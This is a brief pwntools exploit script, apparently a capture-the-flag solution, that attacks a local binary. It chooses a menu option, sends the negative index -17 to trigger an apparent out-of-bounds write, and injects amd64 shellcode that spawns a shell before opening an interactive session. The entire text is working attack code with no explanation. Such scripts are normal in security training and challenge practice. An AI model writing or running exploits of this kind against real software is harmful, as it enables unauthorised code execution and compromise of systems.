from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'

t = process('./bin')

t.recvuntil('choose:\n')
t.sendline('1')
t.readuntil('number\n')
t.sendline('-17')
t.recvuntil('name\n')
t.sendline(asm(shellcraft.amd64.linux.sh()))

t.interactive()
